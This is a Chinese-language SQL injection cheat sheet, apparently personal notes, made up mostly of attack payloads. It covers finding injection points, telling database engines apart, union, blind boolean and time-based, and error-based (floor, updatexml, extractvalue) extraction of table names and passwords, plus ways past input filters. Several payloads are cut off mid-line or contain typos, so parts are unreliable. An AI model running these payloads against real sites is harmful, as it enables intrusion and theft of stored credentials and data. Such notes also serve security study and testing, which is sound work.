# SQL注入

## 注入點測試

##### 數字型
```
$id=@$_GET['id']; //id未经过滤
$sql = "SELECT * FROM sqltest WHERE id='$id'";


?id=1'//报错
?id=1 and 1=1
?id=1 and 1=2//两者回显不同
```
##### 字符型
```
$sql="select * from user where username = '$name'";  //php
select  * from user where username = 'admin'  //sql
$query="select first_name from users where id='$_GET['id']'";  //字符型
1' union select database() #; //输入
select first_name from users where id='1'union select database()#' //sql语句变形

?id=1' and '1'='1--
?id=1' and '1=2--//回显不同
```
##### 搜索型
```
$sql="select * from user where password like '%$pwd%' order by password"; 
'and 1=1 and '%'='  //输入
select * from user where password like '%fendo'and 1=1 and '%'='%' order by password//sql语句

'and 1=1 and '%'='
password'//报错，90存在
password% //报错，95存在
password%'and 1=1 '%'='
password%'and 1=2 '%'='//回显不同
```
##### 布爾型
```
//输入没有回显
?id=1
?id=1'
?id=1''
?id=1%23
?id=1' and 1=1#1
```
##### 報錯型
```
//页面调试会有报错回显
?id=2' and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a)--+
//通过某一种报错语句来判断
```
## 數據庫判斷

常见的数据库Oracle、MySQL、SQL Server、Access、MSsql、mongodb等

关系型数据库：由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql

1.是否可以使用特定的函数来判断，该数据库特有的

len()函数：mssql、mysql、db2

length()函数:Oracle、informix

substring：mssql

substr：oracle

version()>1 返回与@@version>1 相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。

2.是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等

/*  mysql特有注释符，返回错误说明不是mysql

--  是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符

;   是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。

;-- 在注入点后加分号、斜杠、斜杠，返回正常是mssql，返回错误是ACCESS

3.是否可以编码查询

4.是否显可以利用错信息

错误提示Microsoft JET Database Engine 错误 '80040e14'，

JET是ACCESS数据库

ODBC是MSSQL数据库


5.是否存在数据库某些特性辅助判断

and exists (select count(*) from sysobjects)    返回正常是mssql

and exists (select count(*) from msysobjects)   两条，和上一条返回都不正常是ACCESS

如果是字符型，参数后加 ' 最后加 ;--

## 注入方法

##### union注入

```
order by n #确定列数
union select 1，2，3 #进行回显，查看可见位
union select 1,database(),3 #爆破库名
union select 1,table_name,3 from information_schema.tables where table_schema='库名' limit 0,1;#进行表名爆库 limit 0，1显示第一个
union select 1,column_name,3 from information_schema.cloumns where table_schema='库名' and table_name='表名'#进行字段名查询
union select 1,字段名,3 from 库名.表名#获取数据
```

##### 堆叠注入

在SQL中每句指令都会以；结尾

可以通过对查询语句的闭合进行下一句的执行

可以通过这种方法对数据库进行操作

##### 異或注入

通过null与任何进行异或为null用来判断是否有过滤

```
?id=1' length('union')!=0
//如果页面报错，未过滤
//不报错，则为过滤
```

##### 寬字節注入

```
?id=%df'
```

##### 布爾盲注

```
// 判斷庫長度
length(database())>n 

//獲取表長度
(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>0 %23

//獲取表長度
ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))>{1} %23

//获取列名
ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),{0},1))>{1} %23"

//获取内容
ascii(substr((select password from users limit 0,1),{0},1))>{1} %23"
```

##### 時間盲注

```
if()判断前面为真，则运行后面；sleep()延时运行
//判断表长
if(length(database())>9,0,sleep(5)) --+

//获取表名
if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>0,sleep(5)) %23

//获取列名
if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),{0},1))>{1},0,sleep(5)) %23"

//获取内容
if(ascii(substr((select password from users limit 0,1),{0},1))>{1},0,sl
```

##### 報錯注入
######  floor报错
```
//floor,count,group by冲突报错
select count(*),floor(rand(0)*2)x from security.users group by x

//获取数据库名
select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x;

//获取表名
select count(*),concat((select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x;

//获取字段名
select count(*),concat((select column_name from information_schema where where table_schema='库名' and table_name='表名'),floor(rand(0)*2))x from information_schema.tables group by x;

//获取内容
select count(*),concat((select '字段名' from '表名' limit 0,1),floor(ra
```

###### UpdateXml报错注入

```
更新xml文件
符号为‘~’

//查询表名
select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);

//查询字段
select updataxml(0,concat(0x7e,(select concat(column_name) from information_schema.column where table_schema=database() and table_name='表名' limit 0,1)),0);

//获取内容
select updatexml(0,concat(0x7e,(select concat('字段名') from '表名' 
```

###### extractvalue報錯

```
对xml查询函数
和updatexml基本一致，前面符号有变‘/’
//查询表名
select extractvalue(0,concat(0x5c,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);

//查询字段
select extractvalue(0,concat(0x5c,(select concat(column_name) from information_schema.column where table_schema=database() and table_name='表名' limit 0,1)),0);

//获取内容
select extractvalue(0,concat(0x5c,(select concat('字段名') from '表名' li
```

## 過濾繞過
```
//空格
%0a,/**/,()

//引號
用16進制繞過
hex(user)=0x7573657273
selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273

//逗號
可以用from for繞過
select substr(database(0from1for1);

//角括號
greatest繞過
greatest(ascii(substr(database(),0,1)),64)=64

//or,and
and=&&  or=||

//注釋符號(#，--)
使用||'閉合
1'union select 1,2,3||'1
最後一位閉合
1'union select 1,2,'3

//等於號
使用<，>來進行判斷

//union，select，where
雙寫
ununionion
截斷
un/**/ion
大小寫
UniOn

//編碼繞過

```